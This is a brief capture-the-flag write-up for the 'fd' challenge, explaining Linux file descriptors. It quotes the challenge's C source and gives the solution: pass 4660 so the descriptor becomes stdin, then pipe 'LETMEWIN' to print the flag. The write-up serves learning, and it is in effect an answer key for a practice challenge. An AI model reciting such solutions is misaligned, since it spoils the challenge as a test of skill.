# fd

## Overview
This challenge is about understanding file descriptors (fd) and standard input (stdin) in Linux.

The program allows the user to control the file descriptor and reads input from it. By manipulating the fd and providing the correct input, we can obtain the flag.

---

## Source Code Analysis

```c
int fd = atoi(argv[1]) - 0x1234;
len = read(fd, buf, 32);

if(!strcmp("LETMEWIN\n", buf)){
    system("/bin/cat flag");
}
```

### Key Points

- `argv[1]` is used to control the file descriptor
- `read(fd, ...)` reads input from the given file descriptor
- The condition checks whether the input is equal to `"LETMEWIN\n"`

---

## Exploit

### Step 1: Make fd = 0

```text
atoi(argv[1]) - 0x1234 = 0
argv[1] = 0x1234 = 4660
```

---

### Step 2: Send input via stdin

The program reads from stdin, so we use a pipe.

---

### Step 3: Run

```bash
echo "LETMEWIN" | ./fd 4660
```

---

## Execution Flow

```text
echo -> stdout
      -> pipe
      -> stdin (fd 0)
      -> read(0, buf, 32)
      -> strcmp success
      -> print flag
```

---

## What I Learned

- File descriptors are used for input/output in Linux
- `0 = stdin`, `1 = stdout`, `2 = stderr`
- `read()` reads raw bytes, not strings
- stdin can be controlled using pipes (`|`)

---

## Summary

By setting the file descriptor to stdin (fd=0) and sending the correct input via a pipe, we can satisfy the condition and get the flag.
